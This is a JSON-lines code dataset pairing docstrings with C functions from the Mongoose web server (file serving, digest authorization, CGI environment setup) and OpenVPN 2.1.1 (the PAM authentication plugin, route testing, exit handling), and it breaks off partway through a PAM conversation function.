{"docstring": "// For a given PUT path, create all intermediate subdirectories\n// for given path. Return 0 if the path itself is a directory,\n// or -1 on error, 1 if OK.\n", "func_signal": "static int put_dir(struct mg_connection *conn, const char *path)", "code": "{\n\tchar buf[PATH_MAX];\n\tconst char *s, *p;\n\tstruct file file;\n\tint len, res = 1;\n\n\tfor (s = p = path + 2; (p = strchr(s, '/')) != NULL; s = ++p) {\n\t\tlen = p - path;\n\t\tif (len >= (int) sizeof(buf)) {\n\t\t\tres = -1;\n\t\t\tbreak;\n\t\t}\n\t\tmemcpy(buf, path, len);\n\t\tbuf[len] = '\\0';\n\n\t\t// Try to create intermediate directory\n\t\tDEBUG_TRACE((\"mkdir(%s)\", buf));\n\t\tif (!mg_stat(conn, buf, &file) && mg_mkdir(buf, 0755) != 0) {\n\t\t\tres = -1;\n\t\t\tbreak;\n\t\t}\n\n\t\t// Is path itself a directory?\n\t\tif (p[1] == '\\0') {\n\t\t\tres = 0;\n\t\t}\n\t}\n\n\treturn res;\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// Write data to the IO channel - opened file descriptor, socket or SSL\n// descriptor. Return number of bytes written.\n", "func_signal": "static int64_t push(FILE *fp, SOCKET sock, SSL *ssl, const char *buf,\n\t\tint64_t len)", "code": "{\n\tint64_t sent;\n\tint n, k;\n\n\tsent = 0;\n\twhile (sent < len) {\n\n\t\t// How many bytes we send in this iteration\n\t\tk = len - sent > INT_MAX ? INT_MAX : (int) (len - sent);\n\n\t\tif (ssl != NULL) {\n\t\t\tn = SSL_write(ssl, buf + sent, k);\n\t\t} else if (fp != NULL) {\n\t\t\tn = (int) fwrite(buf + sent, 1, (size_t) k, fp);\n\t\t\tif (ferror(fp))\n\t\t\t\tn = -1;\n\t\t} else {\n\t\t\tn = send(sock, buf + sent, (size_t) k, MSG_NOSIGNAL);\n\t\t}\n\n\t\tif (n < 0)\n\t\t\tbreak;\n\n\t\tsent += n;\n\t}\n\n\treturn sent;\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "/* ----------------------------------------------------- */\n", "func_signal": "void mg_send_file(struct mg_connection *conn, const char *path)", "code": "{\n\tstruct file file;\n\tif (mg_stat(conn, path, &file)) {\n\t\thandle_file_request(conn, path, &file);\n\t} else {\n\t\tsend_http_error(conn, 404, \"Not Found\", \"%s\", \"File not found\");\n\t}\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// !NO_SSL\n", "func_signal": "static int set_gpass_option(struct mg_context *ctx)", "code": "{\n\tstruct file file;\n\tconst char *path = ctx->config[GLOBAL_PASSWORDS_FILE];\n\tif (path != NULL && !mg_stat(fc(ctx), path, &file)) {\n\t\tcry(fc(ctx), \"Cannot open %s: %s\", path, strerror(ERRNO));\n\t\treturn 0;\n\t}\n\treturn 1;\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// Return HTTP header value, or NULL if not found.\n", "func_signal": "static const char *get_header(const struct mg_request_info *ri,\n\t\tconst char *name)", "code": "{\n\tint i;\n\n\tfor (i = 0; i < ri->num_headers; i++)\n\t\tif (!mg_strcasecmp(name, ri->http_headers[i].name))\n\t\t\treturn ri->http_headers[i].value;\n\n\treturn NULL;\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// Return 1 if request is authorised, 0 otherwise.\n", "func_signal": "static int check_authorization(struct mg_connection *conn, const char *path)", "code": "{\n\tchar fname[PATH_MAX];\n\tstruct vec uri_vec, filename_vec;\n\tconst char *list;\n\tstruct file file = STRUCT_FILE_INITIALIZER;\n\tint authorized = 1;\n\n\tlist = conn->ctx->config[PROTECT_URI];\n\twhile ((list = next_option(list, &uri_vec, &filename_vec)) != NULL) {\n\t\tif (!memcmp(conn->request_info.uri, uri_vec.ptr, uri_vec.len)) {\n\t\t\tmg_snprintf(conn, fname, sizeof(fname), \"%.*s\",\n\t\t\t\t\t(int) filename_vec.len, filename_vec.ptr);\n\t\t\tif (!mg_fopen(conn, fname, \"r\", &file)) {\n\t\t\t\tcry(conn, \"%s: cannot open %s: %s\", __func__, fname, strerror(errno));\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (!is_file_opened(&file)) {\n\t\topen_auth_file(conn, path, &file);\n\t}\n\n\tif (is_file_opened(&file)) {\n\t\tauthorized = authorize(conn, &file);\n\t\tmg_fclose(&file);\n\t}\n\n\treturn authorized;\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// Return True if we should reply 304 Not Modified.\n", "func_signal": "static int is_not_modified(const struct mg_connection *conn,\n\t\tconst struct file *filep)", "code": "{\n\tchar etag[64];\n\tconst char *ims = mg_get_header(conn, \"If-Modified-Since\");\n\tconst char *inm = mg_get_header(conn, \"If-None-Match\");\n\tconstruct_etag(etag, sizeof(etag), filep);\n\treturn (inm != NULL && !mg_strcasecmp(etag, inm)) ||\n\t\t(ims != NULL && filep->modification_time <= parse_date_string(ims));\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// !NO_CGI\n", "func_signal": "static int set_non_blocking_mode(SOCKET sock)", "code": "{\n\tunsigned long on = 1;\n\treturn ioctlsocket(sock, FIONBIO, &on);\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// pointer into the vars array.\n", "func_signal": "static char *addenv(struct cgi_env_block *block, const char *fmt, ...)", "code": "{\n\t\tint n, space;\n\t\tchar *added;\n\t\tva_list ap;\n\n\t\t// Calculate how much space is left in the buffer\n\t\tspace = sizeof(block->buf) - block->len - 2;\n\t\tassert(space >= 0);\n\n\t\t// Make a pointer to the free space int the buffer\n\t\tadded = block->buf + block->len;\n\n\t\t// Copy VARIABLE=VALUE\\0 string into the free space\n\t\tva_start(ap, fmt);\n\t\tn = mg_vsnprintf(block->conn, added, (size_t) space, fmt, ap);\n\t\tva_end(ap);\n\n\t\t// Make sure we do not overflow buffer and the envp array\n\t\tif (n > 0 && n + 1 < space &&\n\t\t\t\tblock->nvars < (int) ARRAY_SIZE(block->vars) - 2) {\n\t\t\t// Append a pointer to the added string into the envp array\n\t\t\tblock->vars[block->nvars++] = added;\n\t\t\t// Bump up used length counter. Include \\0 terminator\n\t\t\tblock->len += n + 1;\n\t\t} else {\n\t\t\tcry(block->conn, \"%s: CGI env buffer truncated for [%s]\", __func__, fmt);\n\t\t}\n\n\t\treturn added;\n\t}\n\nstatic void prepare_cgi_environment(struct mg_connection *conn,\n\t\tconst char *prog,\n\t\tstruct cgi_env_block *blk) {\n\tconst char *s, *slash;\n\tstruct vec var_vec;\n\tchar *p, src_addr[20];\n\tint  i;\n\n\tblk->len = blk->nvars = 0;\n\tblk->conn = conn;\n\tsockaddr_to_string(src_addr, sizeof(src_addr), &conn->client.rsa);\n\n\taddenv(blk, \"SERVER_NAME=%s\", conn->ctx->config[AUTHENTICATION_DOMAIN]);\n\taddenv(blk, \"SERVER_ROOT=%s\", conn->ctx->config[DOCUMENT_ROOT]);\n\taddenv(blk, \"DOCUMENT_ROOT=%s\", conn->ctx->config[DOCUMENT_ROOT]);\n\n\t// Prepare the environment block\n\taddenv(blk, \"%s\", \"GATEWAY_INTERFACE=CGI/1.1\");\n\taddenv(blk, \"%s\", \"SERVER_PROTOCOL=HTTP/1.1\");\n\taddenv(blk, \"%s\", \"REDIRECT_STATUS=200\"); // For PHP\n\n\t// TODO(lsm): fix this for IPv6 case\n\taddenv(blk, \"SERVER_PORT=%d\", ntohs(conn->client.lsa.sin.sin_port));\n\n\taddenv(blk, \"REQUEST_METHOD=%s\", conn->request_info.request_method);\n\taddenv(blk, \"REMOTE_ADDR=%s\", src_addr);\n\taddenv(blk, \"REMOTE_PORT=%d\", conn->request_info.remote_port);\n\taddenv(blk, \"REQUEST_URI=%s\", conn->request_info.uri);\n\n\t// SCRIPT_NAME\n\tassert(conn->request_info.uri[0] == '/');\n\tslash = strrchr(conn->request_info.uri, '/');\n\tif ((s = strrchr(prog, '/')) == NULL)\n\t\ts = prog;\n\taddenv(blk, \"SCRIPT_NAME=%.*s%s\", (int) (slash - conn->request_info.uri),\n\t\t\tconn->request_info.uri, s);\n\n\taddenv(blk, \"SCRIPT_FILENAME=%s\", prog);\n\taddenv(blk, \"PATH_TRANSLATED=%s\", prog);\n\taddenv(blk, \"HTTPS=%s\", conn->ssl == NULL ? \"off\" : \"on\");\n\n\tif ((s = mg_get_header(conn, \"Content-Type\")) != NULL)\n\t\taddenv(blk, \"CONTENT_TYPE=%s\", s);\n\n\tif (conn->request_info.query_string != NULL)\n\t\taddenv(blk, \"QUERY_STRING=%s\", conn->request_info.query_string);\n\n\tif ((s = mg_get_header(conn, \"Content-Length\")) != NULL)\n\t\taddenv(blk, \"CONTENT_LENGTH=%s\", s);\n\n\tif ((s = getenv(\"PATH\")) != NULL)\n\t\taddenv(blk, \"PATH=%s\", s);\n\n\tif (conn->path_info != NULL) {\n\t\taddenv(blk, \"PATH_INFO=%s\", conn->path_info);\n\t}\n\n#if defined(_WIN32)\n\tif ((s = getenv(\"COMSPEC\")) != NULL) {\n\t\taddenv(blk, \"COMSPEC=%s\", s);\n\t}\n\tif ((s = getenv(\"SYSTEMROOT\")) != NULL) {\n\t\taddenv(blk, \"SYSTEMROOT=%s\", s);\n\t}\n\tif ((s = getenv(\"SystemDrive\")) != NULL) {\n\t\taddenv(blk, \"SystemDrive=%s\", s);\n\t}\n#else\n\tif ((s = getenv(\"LD_LIBRARY_PATH\")) != NULL)\n\t\taddenv(blk, \"LD_LIBRARY_PATH=%s\", s);\n#endif // _WIN32\n\n\tif ((s = getenv(\"PERLLIB\")) != NULL)\n\t\taddenv(blk, \"PERLLIB=%s\", s);\n\n\tif (conn->request_info.remote_user != NULL) {\n\t\taddenv(blk, \"REMOTE_USER=%s\", conn->request_info.remote_user);\n\t\taddenv(blk, \"%s\", \"AUTH_TYPE=Digest\");\n\t}\n\n\t// Add all headers as HTTP_* variables\n\tfor (i = 0; i < conn->request_info.num_headers; i++) {\n\t\tp = addenv(blk, \"HTTP_%s=%s\",\n\t\t\t\tconn->request_info.http_headers[i].name,\n\t\t\t\tconn->request_info.http_headers[i].value);\n\n\t\t// Convert variable name into uppercase, and change - to _\n\t\tfor (; *p != '=' && *p != '\\0'; p++) {\n\t\t\tif (*p == '-')\n\t\t\t\t*p = '_';\n\t\t\t*p = (char) toupper(* (unsigned char *) p);\n\t\t}\n\t}\n\n\t// Add user-specified variables\n\ts = conn->ctx->config[CGI_ENVIRONMENT];\n\twhile ((s = next_option(s, &var_vec, NULL)) != NULL) {\n\t\taddenv(blk, \"%.*s\", (int) var_vec.len, var_vec.ptr);\n\t}\n\n\tblk->vars[blk->nvars++] = NULL;\n\tblk->buf[blk->len++] = '\\0';\n\n\tassert(blk->nvars < (int) ARRAY_SIZE(blk->vars));\n\tassert(blk->len > 0);\n\tassert(blk->len < (int) sizeof(blk->buf));\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// Master thread adds accepted socket to a queue\n", "func_signal": "static void produce_socket(struct mg_context *ctx, const struct socket *sp)", "code": "{\n\t(void) pthread_mutex_lock(&ctx->mutex);\n\n\t// If the queue is full, wait\n\twhile (ctx->stop_flag == 0 &&\n\t\t\tctx->sq_head - ctx->sq_tail >= (int) ARRAY_SIZE(ctx->queue)) {\n\t\t(void) pthread_cond_wait(&ctx->sq_empty, &ctx->mutex);\n\t}\n\n\tif (ctx->sq_head - ctx->sq_tail < (int) ARRAY_SIZE(ctx->queue)) {\n\t\t// Copy socket to the queue and increment head\n\t\tctx->queue[ctx->sq_head % ARRAY_SIZE(ctx->queue)] = *sp;\n\t\tctx->sq_head++;\n\t\tDEBUG_TRACE((\"queued socket %d\", sp->sock));\n\t}\n\n\t(void) pthread_cond_signal(&ctx->sq_full);\n\t(void) pthread_mutex_unlock(&ctx->mutex);\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// Authorize against the opened passwords file. Return 1 if authorized.\n", "func_signal": "static int authorize(struct mg_connection *conn, struct file *filep)", "code": "{\n\tstruct ah ah;\n\tchar line[256], f_user[256], ha1[256], f_domain[256], buf[MG_BUF_LEN], *p;\n\n\tif (!parse_auth_header(conn, buf, sizeof(buf), &ah)) {\n\t\treturn 0;\n\t}\n\n\t// Loop over passwords file\n\tp = (char *) filep->membuf;\n\twhile (mg_fgets(line, sizeof(line), filep, &p) != NULL) {\n\t\tif (sscanf(line, \"%[^:]:%[^:]:%s\", f_user, f_domain, ha1) != 3) {\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (!strcmp(ah.user, f_user) &&\n\t\t\t\t!strcmp(conn->ctx->config[AUTHENTICATION_DOMAIN], f_domain))\n\t\t\treturn check_password(conn->request_info.request_method, ha1, ah.uri,\n\t\t\t\t\tah.nonce, ah.nc, ah.cnonce, ah.qop, ah.response);\n\t}\n\n\treturn 0;\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// Parse UTC date-time string, and return the corresponding time_t value.\n", "func_signal": "static time_t parse_date_string(const char *datetime)", "code": "{\n\tstatic const unsigned short days_before_month[] = {\n\t\t0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334\n\t};\n\tchar month_str[32];\n\tint second, minute, hour, day, month, year, leap_days, days;\n\ttime_t result = (time_t) 0;\n\n\tif (((sscanf(datetime, \"%d/%3s/%d %d:%d:%d\",\n\t\t\t\t\t\t&day, month_str, &year, &hour, &minute, &second) == 6) ||\n\t\t\t\t(sscanf(datetime, \"%d %3s %d %d:%d:%d\",\n\t\t\t\t\t\t&day, month_str, &year, &hour, &minute, &second) == 6) ||\n\t\t\t\t(sscanf(datetime, \"%*3s, %d %3s %d %d:%d:%d\",\n\t\t\t\t\t\t&day, month_str, &year, &hour, &minute, &second) == 6) ||\n\t\t\t\t(sscanf(datetime, \"%d-%3s-%d %d:%d:%d\",\n\t\t\t\t\t\t&day, month_str, &year, &hour, &minute, &second) == 6)) &&\n\t\t\tyear > 1970 &&\n\t\t\t(month = get_month_index(month_str)) != -1) {\n\t\tleap_days = num_leap_years(year) - num_leap_years(1970);\n\t\tyear -= 1970;\n\t\tdays = year * 365 + days_before_month[month] + (day - 1) + leap_days;\n\t\tresult = days * 24 * 3600 + hour * 3600 + minute * 60 + second;\n\t}\n\n\treturn result;\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "// This function is called from send_directory() and used for\n// sorting directory entries by size, or name, or modification time.\n// On windows, __cdecl specification is needed in case if project is built\n// with __stdcall convention. qsort always requires __cdels callback.\n", "func_signal": "static int WINCDECL compare_dir_entries(const void *p1, const void *p2)", "code": "{\n\tconst struct de *a = (const struct de *) p1, *b = (const struct de *) p2;\n\tconst char *query_string = a->conn->request_info.query_string;\n\tint cmp_result = 0;\n\n\tif (query_string == NULL) {\n\t\tquery_string = \"na\";\n\t}\n\n\tif (a->file.is_directory && !b->file.is_directory) {\n\t\treturn -1;  // Always put directories on top\n\t} else if (!a->file.is_directory && b->file.is_directory) {\n\t\treturn 1;   // Always put directories on top\n\t} else if (*query_string == 'n') {\n\t\tcmp_result = strcmp(a->file_name, b->file_name);\n\t} else if (*query_string == 's') {\n\t\tcmp_result = a->file.size == b->file.size ? 0 :\n\t\t\ta->file.size > b->file.size ? 1 : -1;\n\t} else if (*query_string == 'd') {\n\t\tcmp_result = a->file.modification_time == b->file.modification_time ? 0 :\n\t\t\ta->file.modification_time > b->file.modification_time ? 1 : -1;\n\t}\n\n\treturn query_string[1] == 'd' ? -cmp_result : cmp_result;\n}", "path": "jni\\liveTV\\mongoose.c", "repo_name": "jgfntu/hls_proxy", "stars": 48, "license": "None", "language": "c", "size": 17251}
{"docstring": "/*\n * Return 1 if authenticated and 0 if failed.\n * Called once for every username/password\n * to be authenticated.\n */\n", "func_signal": "static int\npam_auth (const char *service, const struct user_pass *up)", "code": "{\n  struct pam_conv conv;\n  pam_handle_t *pamh = NULL;\n  int status = PAM_SUCCESS;\n  int ret = 0;\n  const int name_value_list_provided = (up->name_value_list && up->name_value_list->len > 0);\n\n  /* Initialize PAM */\n  conv.conv = my_conv;\n  conv.appdata_ptr = (void *)up;\n  status = pam_start (service, name_value_list_provided ? NULL : up->username, &conv, &pamh);\n  if (status == PAM_SUCCESS)\n    {\n      /* Call PAM to verify username/password */\n      status = pam_authenticate(pamh, 0);\n      if (status == PAM_SUCCESS)\n\tstatus = pam_acct_mgmt (pamh, 0);\n      if (status == PAM_SUCCESS)\n\tret = 1;\n\n      /* Output error message if failed */\n      if (!ret)\n\t{\n\t  fprintf (stderr, \"AUTH-PAM: BACKGROUND: user '%s' failed to authenticate: %s\\n\",\n\t\t   up->username,\n\t\t   pam_strerror (pamh, status));\n\t}\n\n      /* Close PAM */\n      pam_end (pamh, status);      \n    }\n\n  return ret;\n}", "path": "src\\openvpn-2.1.1\\plugin\\auth-pam\\auth-pam.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Init thread-local variables\n */\n", "func_signal": "void\nmsg_thread_init (void)", "code": "{\n#ifdef USE_PTHREAD\n  ASSERT (!pthread_key_create (&x_msg_prefix_key, NULL));\n#endif\n}", "path": "src\\openvpn-2.1.1\\error.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Exiting.\n */\n", "func_signal": "void\nopenvpn_exit (const int status)", "code": "{\n#ifdef ENABLE_PLUGIN\n  void plugin_abort (void);\n#endif\n\n#ifdef WIN32\n  uninit_win32 ();\n#endif\n\n  close_syslog ();\n\n#ifdef ENABLE_PLUGIN\n  plugin_abort ();\n#endif\n\n#if PORT_SHARE\n  if (port_share)\n    port_share_abort (port_share);\n#endif\n\n#ifdef ABORT_ON_ERROR\n  if (status == OPENVPN_EXIT_STATUS_ERROR)\n    abort ();\n#endif\n\n  if (status == OPENVPN_EXIT_STATUS_GOOD)\n    perf_output_results ();\n\n  exit (status);\n}", "path": "src\\openvpn-2.1.1\\error.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * If we tried to add routes now, would we succeed?\n */\n", "func_signal": "bool\ntest_routes (const struct route_list *rl, const struct tuntap *tt)", "code": "{\n  struct gc_arena gc = gc_new ();\n  const IP_ADAPTER_INFO *adapters = get_adapter_info_list (&gc);\n  bool ret = false;\n  int count = 0;\n  int good = 0;\n  int ambig = 0;\n  bool adapter_up = false;\n\n  if (is_adapter_up (tt, adapters))\n    {\n      ret = true;\n      adapter_up = true;\n\n      if (rl)\n\t{\n\t  int i;\n\t  for (i = 0; i < rl->n; ++i)\n\t    test_route_helper (&ret, &count, &good, &ambig, adapters, rl->routes[i].gateway);\n\n\t  if ((rl->flags & RG_ENABLE) && rl->spec.remote_endpoint_defined)\n\t    test_route_helper (&ret, &count, &good, &ambig, adapters, rl->spec.remote_endpoint);\n\t}\n    }\n\n  msg (D_ROUTE, \"TEST ROUTES: %d/%d succeeded len=%d ret=%d a=%d u/d=%s\",\n       good,\n       count,\n       rl ? rl->n : -1,\n       (int)ret,\n       ambig,\n       adapter_up ? \"up\" : \"down\");\n\n  gc_free (&gc);\n  return ret;\n}", "path": "src\\openvpn-2.1.1\\route.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Return the length of a string array\n */\n", "func_signal": "static int\nstring_array_len (const char *array[])", "code": "{\n  int i = 0;\n  if (array)\n    {\n      while (array[i])\n\t++i;\n    }\n  return i;\n}", "path": "src\\openvpn-2.1.1\\plugin\\auth-pam\\auth-pam.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Close most of parent's fds.\n * Keep stdin/stdout/stderr, plus one\n * other fd which is presumed to be\n * our pipe back to parent.\n * Admittedly, a bit of a kludge,\n * but posix doesn't give us a kind\n * of FD_CLOEXEC which will stop\n * fds from crossing a fork().\n */\n", "func_signal": "static void\nclose_fds_except (int keep)", "code": "{\n  int i;\n  closelog ();\n  for (i = 3; i <= 100; ++i)\n    {\n      if (i != keep)\n\tclose (i);\n    }\n}", "path": "src\\openvpn-2.1.1\\plugin\\auth-pam\\auth-pam.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Return 1 if query matches match.\n */\n", "func_signal": "static int\nname_value_match (const char *query, const char *match)", "code": "{\n  while (!isalnum (*query))\n    {\n      if (*query == '\\0')\n\treturn 0;\n      ++query;\n    }\n  return strncasecmp (match, query, strlen (match)) == 0;\n}", "path": "src\\openvpn-2.1.1\\plugin\\auth-pam\\auth-pam.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Show current routing table\n */\n", "func_signal": "void\nshow_routes (int msglev)", "code": "{\n  struct gc_arena gc = gc_new ();\n  int i;\n\n  const MIB_IPFORWARDTABLE *rt = get_windows_routing_table (&gc);\n\n  msg (msglev, \"SYSTEM ROUTING TABLE\");\n  if (rt)\n    {\n      for (i = 0; i < rt->dwNumEntries; ++i)\n\t{\n\t  msg (msglev, \"%s\", format_route_entry (&rt->table[i], &gc));\n\t}\n    }\n  gc_free (&gc);\n}", "path": "src\\openvpn-2.1.1\\route.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Background process -- runs with privilege.\n */\n", "func_signal": "static void\npam_server (int fd, const char *service, int verb, const struct name_value_list *name_value_list)", "code": "{\n  struct user_pass up;\n  int command;\n#if DLOPEN_PAM\n  static const char pam_so[] = \"libpam.so\";\n#endif\n\n  /*\n   * Do initialization\n   */\n  if (DEBUG (verb))\n    fprintf (stderr, \"AUTH-PAM: BACKGROUND: INIT service='%s'\\n\", service);\n\n#if DLOPEN_PAM\n  /*\n   * Load PAM shared object\n   */\n  if (!dlopen_pam (pam_so))\n    {\n      fprintf (stderr, \"AUTH-PAM: BACKGROUND: could not load PAM lib %s: %s\\n\", pam_so, dlerror());\n      send_control (fd, RESPONSE_INIT_FAILED);\n      goto done;\n    }\n#endif\n\n  /*\n   * Tell foreground that we initialized successfully\n   */\n  if (send_control (fd, RESPONSE_INIT_SUCCEEDED) == -1)\n    {\n      fprintf (stderr, \"AUTH-PAM: BACKGROUND: write error on response socket [1]\\n\");\n      goto done;\n    }\n\n  /*\n   * Event loop\n   */\n  while (1)\n    {\n      memset (&up, 0, sizeof (up));\n      up.verb = verb;\n      up.name_value_list = name_value_list;\n\n      /* get a command from foreground process */\n      command = recv_control (fd);\n\n      if (DEBUG (verb))\n\tfprintf (stderr, \"AUTH-PAM: BACKGROUND: received command code: %d\\n\", command);\n\n      switch (command)\n\t{\n\tcase COMMAND_VERIFY:\n\t  if (recv_string (fd, up.username, sizeof (up.username)) == -1\n\t      || recv_string (fd, up.password, sizeof (up.password)) == -1)\n\t    {\n\t      fprintf (stderr, \"AUTH-PAM: BACKGROUND: read error on command channel: code=%d, exiting\\n\",\n\t\t       command);\n\t      goto done;\n\t    }\n\n\t  if (DEBUG (verb))\n\t    {\n#if 0\n\t      fprintf (stderr, \"AUTH-PAM: BACKGROUND: USER/PASS: %s/%s\\n\",\n\t\t       up.username, up.password);\n#else\n\t      fprintf (stderr, \"AUTH-PAM: BACKGROUND: USER: %s\\n\", up.username);\n#endif\n\t    }\n\n\t  if (pam_auth (service, &up)) /* Succeeded */\n\t    {\n\t      if (send_control (fd, RESPONSE_VERIFY_SUCCEEDED) == -1)\n\t\t{\n\t\t  fprintf (stderr, \"AUTH-PAM: BACKGROUND: write error on response socket [2]\\n\");\n\t\t  goto done;\n\t\t}\n\t    }\n\t  else /* Failed */\n\t    {\n\t      if (send_control (fd, RESPONSE_VERIFY_FAILED) == -1)\n\t\t{\n\t\t  fprintf (stderr, \"AUTH-PAM: BACKGROUND: write error on response socket [3]\\n\");\n\t\t  goto done;\n\t\t}\n\t    }\n\t  break;\n\n\tcase COMMAND_EXIT:\n\t  goto done;\n\n\tcase -1:\n\t  fprintf (stderr, \"AUTH-PAM: BACKGROUND: read error on command channel\\n\");\n\t  goto done;\n\n\tdefault:\n\t  fprintf (stderr, \"AUTH-PAM: BACKGROUND: unknown command code: code=%d, exiting\\n\",\n\t\t   command);\n\t  goto done;\n\t}\n    }\n done:\n\n#if DLOPEN_PAM\n  dlclose_pam ();\n#endif\n  if (DEBUG (verb))\n    fprintf (stderr, \"AUTH-PAM: BACKGROUND: EXIT\\n\");\n\n  return;\n}", "path": "src\\openvpn-2.1.1\\plugin\\auth-pam\\auth-pam.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Given an environmental variable name, search\n * the envp array for its value, returning it\n * if found or NULL otherwise.\n */\n", "func_signal": "static const char *\nget_env (const char *name, const char *envp[])", "code": "{\n  if (envp)\n    {\n      int i;\n      const int namelen = strlen (name);\n      for (i = 0; envp[i]; ++i)\n\t{\n\t  if (!strncmp (envp[i], name, namelen))\n\t    {\n\t      const char *cp = envp[i] + namelen;\n\t      if (*cp == '=')\n\t\treturn cp + 1;\n\t    }\n\t}\n    }\n  return NULL;\n}", "path": "src\\openvpn-2.1.1\\plugin\\auth-pam\\auth-pam.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * Usually we ignore signals, because our parent will\n * deal with them.\n */\n", "func_signal": "static void\nset_signals (void)", "code": "{\n  signal (SIGTERM, SIG_DFL);\n\n  signal (SIGINT, SIG_IGN);\n  signal (SIGHUP, SIG_IGN);\n  signal (SIGUSR1, SIG_IGN);\n  signal (SIGUSR2, SIG_IGN);\n  signal (SIGPIPE, SIG_IGN);\n}", "path": "src\\openvpn-2.1.1\\plugin\\auth-pam\\auth-pam.c", "repo_name": "qsun/ParDiff-VPN", "stars": 59, "license": "None", "language": "c", "size": 7498}
{"docstring": "/*\n * PAM conversation function\n */\n", "func_signal": "static int\nmy_conv (int n, const struct pam_message **msg_array,\n\t struct pam_response **response_array, void *appdata_ptr)", "code": "{\n  const struct user_pass *up = ( const struct user_pass *) appdata_ptr;\n  struct pam_response *aresp;\n  int i;\n  int ret = PAM_SUCCESS;\n\n  *response_array = NULL;\n\n  if (n <= 0 || n > PAM_MAX_NUM_MSG)\n    return (PAM_CONV_ERR);\n  if ((aresp = calloc (n, sizeof *aresp)) == NULL)\n    return (PAM_BUF_ERR);\n\n  /* loop through each PAM-module query */\n  for (i = 0; i < n; ++i)\n    {\n      const struct pam_message *msg = msg_array[i];\n      aresp[i].resp_retcode = 0;\n      aresp[i].resp = NULL;\n\n      if (DEBUG (up->verb))\n\t{\n\t  fprintf (stderr, \"AUTH-PAM: BACKGROUND: my_conv[%d] query='%s' style=%d\\n\",\n\t\t   i,\n\t\t   msg->msg ? msg->msg : \"NULL\",\n\t\t   msg->msg_style);\n\t}\n\n      if (up->name_value_list && up->name_value_list->len > 0)\n\t{\n\t  /* use name/value list match method */\n\t  const struct name_value_list *list = up->name_value_list;\n\t  int j;\n\n\t  /* loop through name/value pairs */\n\t  for (j = 0; j < list->len; ++j)\n\t    {\n\t      const char *match_name = list->data[j].name;\n\t      const char *match_value = list->data[j].value;\n\n\t      if (name_value_match (msg->msg, match_name))\n\t\t{\n\t\t  /* found name/value match */\n\t\t  const char *return_value = NULL;\n\n\t\t  if (DEBUG (up->verb))\n\t\t    fprintf (stderr, \"AUTH-PAM: BACKGROUND: name match found, query/match-string ['%s', '%s'] = '%s'\\n\",\n\t\t\t     msg->msg,\n\t\t\t     match_name,\n\t\t\t     match_value);\n\n\t\t  if (!strcmp (match_value, \"USERNAME\"))\n\t\t    return_value = up->username;\n\t\t  else if (!strcmp (match_value, \"PASSWORD\"))\n\t\t    return_value = up->password;\n\t\t  else\n\t\t    return_value = match_value;\n\n\t\t  aresp[i].resp = strdup (return_value);\n\t\t  if (aresp[i].resp == NULL)\n\t\t    ret = PAM_CONV_ERR;\n\t\t  break;\n\t\t}\n\t    }\n\n\t  if (j == list->len)\n\t    ret = PAM_CONV_ERR;\n\t}\n      else\n\t{\n\t  /* use PAM_PROMPT_ECHO_x hints */\n\t  switch (msg->msg_style)\n\t    {\n\t    case PAM_PROMPT_ECHO_OFF:\n\t      aresp[i].resp = strdup (up->password);\n\t      if (aresp[i].resp == NULL)\n\t\tret = PAM_CONV_ERR;\n\t      break;\n\n\t    case PAM_PROMPT_ECHO_ON:\n\t      aresp[i].resp = strdup (up->username);\n\t      if (aresp[i].resp == NULL)\n\t\tret = PAM_CONV_ERR;\n\t      